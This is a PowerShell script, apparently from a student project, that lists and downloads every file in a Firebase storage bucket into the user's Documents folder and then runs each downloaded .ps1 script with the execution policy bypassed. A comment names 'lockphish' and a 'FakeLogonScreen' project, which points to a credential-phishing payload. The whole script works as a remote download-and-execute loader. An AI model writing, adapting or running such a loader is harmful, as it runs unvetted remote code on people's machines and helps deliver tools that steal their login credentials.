#henter strukt fra firebase backend
#$URL = "https://firebasestorage.googleapis.com/v0/b/bachelor-usb/o/";
$URL = "https://firebasestorage.googleapis.com/v0/b/bachelor-7e242.appspot.com/o/";
$mainFolderElements = (wget -URI $URL).Content;

#finner brukernavn til bruker til link seinere
$usr = $env:USERNAME
$baseFolder = "C:\Users\$usr\Documents\output";

#info for å starte loop
$key = '"name": "';
$keypos = $mainFolderElements.IndexOf($key);
$loops = 0;

cd C:\Users\$usr\Documents
if(!(Test-Path -Path ".\output")){
    New-Item -Path ".\" -Name "output" -ItemType Directory;
}
cd .\output

#main loop
while($keypos -ne -1 -and $loops -lt 100){

    #finner path fra databasen for å rekonsturere strukt
    $startpos = $mainFolderElements.IndexOf($key, $keypos)+$key.Length;
    $endpos = $mainFolderElements.IndexOf('"', $startpos+2);
    $length = $endpos-$startpos;

    #Test-Path -Path "C:\\lockphish/obj/Debug/FakeLogonScreen.csproj.AssemblyReference.cache"
    $path = $mainFolderElements.Substring($startpos,$length);

    $subpath = $path.Split("/");
    
    $currentPath = ".\";
    for ($i = 0; $i -lt $subpath.Length; $i++){

        $currentPath = Join-Path $currentPath $subpath[$i];

        if((-not (Test-Path $currentPath)) -and ($subpath[$i].IndexOf(".") -eq -1)){
            New-Item -Path $currentPath -ItemType Directory;
        }elseif(-not (Test-Path $currentPath)){
            #modifiserer url med %2F for get call til api
            $path = $path.Replace("/","%2F");
            $path = $path + "?alt=media"

            (wget -URI ("$URL$path") -OutFile $currentPath).Content
        }
    }



    $keypos = $mainFolderElements.IndexOf($key, $endpos+3);
    $loops = $loops + 1;
    
}

Get-ChildItem -Path .\ -Filter *.ps1 -Recurse -File -Exclude "getAllScripts.ps1","run.ps1" | ForEach-Object {
    & PowerShell.exe -ExecutionPolicy Bypass -File $_.FullName
}
